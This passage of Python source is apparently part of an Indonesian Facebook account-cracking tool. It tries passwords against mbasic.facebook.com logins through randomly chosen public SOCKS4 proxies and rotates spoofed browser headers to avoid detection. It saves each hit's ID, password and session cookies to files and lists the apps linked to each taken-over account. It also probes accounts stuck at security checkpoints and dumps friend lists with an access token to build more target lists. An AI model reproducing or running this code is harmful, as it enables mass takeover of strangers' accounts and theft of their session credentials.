          try:
               proxs = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
               open('socksku.txt','w').write(proxs)
               nip = rc(proxs)
               proxs = {'http': 'socks4://'+nip}
               ua = Saran(glento=1)
               ua2 = rc(["Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"])
               link = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
               date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next":"https://mbasic.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
               cokz = ";".join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items()])		
               bahasa = rc(['en-US;q=0.8,en;q=0.7','en-GB;q=0.8,en;q=0.7','zh-CN;q=0.8,zh;q=0.7','ms_MY;q=0.8,ms;q=0.7','fr_FR;q=0.8,fr;q=0.7','id-ID;q=0.8,id;q=0.7','jv-ID;q=0.8,id;q=0.7'])
               head = (
			{
			'Host': 'mbasic.facebook.com',
			'cache-control': 'max-age=0',
			'dpr': f'{str(rr(1,5))}',
			'viewport-width': f'{str(rr(400,999))}',
			'sec-ch-ua': f'"Not?A_Brand";v="{str(rr(8,20))}", "Chromium";v="{str(rr(108,114))}", "Google Chrome";v="{str(rr(108,114))}"',
			'sec-ch-ua-mobile': '?1',
			'sec-ch-ua-platform': '"Android"',
			'sec-ch-ua-platform-version': f'"{str(rr(5,14))}.0.0"',
			'sec-ch-ua-full-version-list':f'"Chromium";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Google Chrome";v="{str(rr(99,115))}.0.{str(rr(5000,5999))}.{str(rr(40,99))}", "Not:A-Brand";v="{str(rr(8,20))}.0.0.0"',
			'sec-ch-prefers-color-scheme': 'light',
			'upgrade-insecure-requests': '1',
			'origin': 'https://mbasic.facebook.com',
			'content-type': 'application/x-www-form-urlencoded',
			'user-agent': ua,
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			'x-requested-with': 'com.facebook.katana',
			'sec-fetch-site': 'none',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-user': '?1',
			'sec-fetch-dest': 'document',
			'referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2F{url}%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': bahasa,
	        }
	    )
               po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0",headers=head,data=date,cookies={"cookie":cokz},allow_redirects=False,proxies=proxs)
               if 'c_user' in ses.cookies.get_dict().keys():
                    ses = requests.Session()
                    headapp = {'user-agent': 'SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]'}
                    if 'ya' in taplikasi:
                         ok+=1
                         coki=po.cookies.get_dict()
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'\n')
                         tree = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oku = tree.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         aktif = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",headers=headapp,cookies=coki).text
                         soup = par(aktif, "html.parser")
                         ayu = tree.add(Panel.fit(f"[green] Aplikasi Aktive ",style=f"white"))
                         for ah in soup.find_all("h3"):
                              if "Ditambahkan" in ah.text:
                                   ayu.add(f"{puti}{str(ah.text).replace(f'Ditambahkan',f' {hijo}Ditambahkan')}{puti}")
                         oke = tree.add(Panel.fit(f"[green]{coki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         inactiv = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",headers=headapp,cookies=coki).text
                         siu = par(inactiv, "html.parser")
                         he = tree.add(Panel.fit(f"[yellow] Aplikasi Expired ",style=f"white"))
                         for ina in siu.find_all("h3"):
                              if "Kedaluwarsa" in ina.text:
                                   he.add(f"{puti}{str(ina.text).replace('Kedaluwarsa',f' {kun}Kedaluwarsa')}{puti}")
                         link1 = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=removed",headers=headapp,cookies=coki).text
                         html = par(link1, "html.parser")
                         he = tree.add(Panel.fit(f"[red] Aplikasi Deleted ",style=f"white"))
                         for i in html.find_all("h3"):
                              if "Dihapus" in i.text:
                                   he.add(f"{puti}{str(i.text).replace('Dihapus',f' {mer}Dihapus')}{puti}")
                         prints(tree)
                         break
                         
                    elif 'no' in taplikasi:
                         ok+=1
                         coki = ses.cookies.get_dict()
                         kuki = "datr=" + coki["datr"] + ";" + ("sb=" + coki["sb"]) + ";" + "locale=id_ID" + ";" + ("c_user=" + coki["c_user"]) + ";" + ("xs=" + coki["xs"]) + ";" + ("fr=" + coki["fr"]) + ";"
                         oke = Tree(Panel.fit(f"[green] LOGIN SUCKSES ",style=f"white"))
                         oke.add(Panel.fit(f"[green] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[green]{tahun(idf)} ",style=f"white"))
                         oke.add(Panel.fit(f"[green]{kuki}",style=f"white"))
                         oke.add(Panel.fit(f"[green]{ua}",style=f"white"))
                         prints(oke)
                         open('/sdcard/MBF-OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                         break
                    
               elif "checkpoint" in po.cookies.get_dict().keys():
                    cpe = Tree(Panel.fit(f"[yellow] LOGIN CHECKPOINT ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow] {idf} | {pw} ",style=f"white")).add(Panel.fit(f"[yellow]{tahun(idf)} ",style=f"white"))
                    cpe.add(Panel.fit(f"[yellow]{ua}",style=f"white"))
                    prints(cpe)
                    open('/sdcard/MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
                    akune.append(idf+'|'+pw)
                    ceker(idf,pw)
                    cp+=1
                    break
                    
               else:continue
          except requests.exceptions.ConnectionError:
               time.sleep(31)
     loop+=1
             
###----------[ OPSI ]----------###  	
def ceker(idf,pw):
	global cp
	rc = random.choice
	ses = requests.Session()
	url = "mbasic.facebook.com"
	head = ({"Host": url,"cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://"+url,"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 10; D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7","x-requested-with": "mark.via.gp","sec-fetch-site": "none","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": f"https://{url}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding": "gzip, deflate","accept-language": "en-US,en;q=0.9"})
	try:
		hi = ses.get('https://'+url)
		kontol = sop(ses.post(
		'https://'+url+'/login.php',
		data={
		'email':idf,
	'pass':pw,
'login':'submit'
		},headers=head, allow_redirects=True).text,'html.parser')
		jo = kontol.find(
		'form'
		)
		data = {}
		lion = [
		'nh',
	'jazoest',
'fb_dtsg',
	'submit[Continue]',
		'checkpoint_data'
		]
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = sop(ses.post('https://'+url+str(jo['action']), data=data, headers=head).text,'html.parser')
		opsi = kent.find_all('option')
		if len(opsi)==0:
			tree = Tree("")
			tree.add(Panel.fit(f"\r[green] Tapyes / A2f ( cek di mbasic ) ",style=f"white"))
			prints(tree)
			#open('MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
			#cp+=1
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		tree = Tree("")
		tree.add(Panel.fit(f"\r[red] Spam IP Tidak Dapat Cek Opsi Checkpoint ",style=f"white"))
		prints(tree)
		#open('MBF-CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		#cp+=1

###----------[ HASIL-OK ]----------###     
def hasil_ok():
	try:vin = os.listdir('MBF-OK')
	except FileNotFoundError:
	     prints(Panel.fit(f'File tidak di temukan',style=f'red'))
	     exit()
	if len(vin)==0:
	     prints(Panel.fit(f'Tidak mempunyai file OK',style=f'red'))
	     exit()
	else:
		print(f"\x1b[0m╭────────────────────────────────────────────")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('MBF-OK/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
			     nom = '0'+str(cih)
			     lol.update({str(cih):str(isi)})
			     lol.update({nom:str(isi)})
			     print(f'\x1b[0m└──[ %s. %s ({hijo} %s\x1b[0m Idz )'%(nom,isi,len(hem)))
			else:
			     lol.update({str(cih):str(isi)})
			     print(f'\x1b[0m└──[ %s. %s ({hijo} %s\x1b[0m Idz )'%(nom,isi,len(hem)))
		print(f"\x1b[0m╭────────────────────────────────────────────")
		geeh = input(f'\x1b[0m└──[ Pilih file : ')
		try:geh = lol[geeh]
		except KeyError:
		     prints(Panel.fit(f'Pemasukan salah',style=f'red'))
		     exit()
		try:lin = open('MBF-OK/'+geh,'r').read().splitlines()
		except:
		    prints(Panel.fit(f'File tidak di temukan',style=f'red'))
		    exit()
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{hijo}{cpkuni[0]}\x1b[0m").add(f"{hijo}{cpkuni[1]}\x1b[0m")
			tree.add(f"{hijo}{cpkuni[2]}\x1b[0m")
			prints(tree)
			nocp +=1
		print(f"\x1b[0m╭────────────────────────────────────────────")
		input(f'\x1b[0m└──[ {mer}Klik Enter \x1b[0m]')
		menu()  

###----------[ HASIL-CP ]----------###      
def hasil_cp():
	try:vin = os.listdir('MBF-CP')
	except FileNotFoundError:
	    prints(Panel.fit(f'File tidak di temukan',style=f'red'))
	    exit()
	if len(vin)==0:
	    prints(Panel.fit(f'Tidak mempunyai file CP',style=f'red'))
	    exit()
	else:
		print(f"\x1b[0m╭────────────────────────────────────────────")
		cih = 0
		lol = {}
		for isi in vin:
			try:hem = open('MBF-CP/'+isi,'r').readlines()
			except:continue
			cih+=1
			if cih<100:
			     nom = str(cih)
			     lol.update({str(cih):str(isi)})
			     lol.update({nom:str(isi)})
			     print(f'\x1b[0m└──[ %s. %s ({kun} %s\x1b[0m Idz )'%(nom,isi,len(hem)))
			else:
			     lol.update({str(cih):str(isi)})
			     print(f'\x1b[0m└──[ %s. %s ({kun} %s\x1b[0m Idz )'%(nom,isi,len(hem)))
		print(f"\x1b[0m╭────────────────────────────────────────────")
		geeh = input(f'\x1b[0m└──[ Pilih file : ')
		try:geh = lol[geeh]
		except KeyError:
		    prints(Panel.fit(f'Pemasukan salah',style=f'red'))
		    exit()
		try:lin = open('MBF-CP/'+geh,'r').read().splitlines()
		except:
		    prints(Panel.fit(f'File tidak di temukan',style=f'red'))
		    exit()
		nocp=0
		for cpku in range(len(lin)):
			cpkuni=lin[nocp].split('|')
			tree = Tree("")
			tree.add(f"{kun}{cpkuni[0]}\x1b[0m").add(f"{kun}{cpkuni[1]}\x1b[0m")
			prints(tree)
			nocp +=1
		print(f"\x1b[0m╭────────────────────────────────────────────")
		input(f'\x1b[0m└──[ {mer}Klik Enter \x1b[0m]')
		menu()  
		
###----------[ DUMP-FILE ]----------###       		
def dump_target(cok,token):
	try:
		os.mkdir('/sdcard/MBF-DUMP')
	except:
	     pass
	try:
		head = ({"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"})
		if len(id) == 0:
		    params = ({'access_token': token,'fields': "friends"})
		else:
		    params = ({'access_token': token,'fields': "friends"})
		print(f"\x1b[0m╭────────────────────────────────────────────")
		xyc = input(f"\x1b[0m└──[ UID : ")
		print(f"\x1b[0m╭────────────────────────────────────────────")
		xyd = input(f"\x1b[0m└──[ Name file dump : ")
		xxr  = ('/sdcard/MBF-DUMP/' + xyd + '.txt').replace(' ', '_')
		xxx = open(xxr, 'w')
		xnx = requests.get('https://graph.facebook.com/{}'.format(xyc),params=params,headers=head,cookies={'cookies':cok}).json()
		for xxn in xnx['friends']['data']:
		    id.append(xxn['id']+'|'+xxn['name'])
		    xxx.write(xxn['id']+'|'+xxn['name']+ '\n')
		    print('\r\x1b[0m└──[ ID : %s '%(len(id)),end='')
		    time.sleep(0.0050)
		print(f"\n\x1b[0m╭────────────────────────────────────────────")
		print(f"\x1b[0m└──[ Berhasil Dump Id Dari Publik")
		print(f"\x1b[0m└──[ Salin Output File ( %s )"%(xxr))
		exit()
	except (KeyError,IOError):
		os.remove(xxr)
		prints(Panel.fit(f"[red] Gagal dump id tidak publik ",style=f"white"))
		time.sleep(3)
		menu()
	      						
###----------[ OKEH ]----------###       			
def okeh():
	oke = Tree(Panel.fit(f"\r[white] Crack Telah Selesai Dengan Jumlah [green]OK : {ok}[white] Dan Jumlah [yellow]CP : {cp} ",style=f"white"))
	oke.add(Panel.fit(f"\r[white] Apakah Ingin Lanjut Crack Kembali (y/t) ",style=f"white"))
	prints(oke)
	gas = input(f"\x1b[0m└──[ Pilih : ")
	if gas in ['y','Y','ya','YA']:
	    menu()
	else:
		oke = Tree("")
		oke.add(Panel.fit(f"\r[yellow] Good Byee Jangan Lupa Bersyukur Dengan Hasilnya ",style=f"white"))
		prints(oke)
		time.sleep(2)
		exit()

###----------[ SYSTEM ]----------###       	
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('MBF-DUMP')
	except:pass
	try:os.mkdir('MBF-OK')
	except:pass
	try:os.mkdir('MBF-CP')
	except:pass
	login()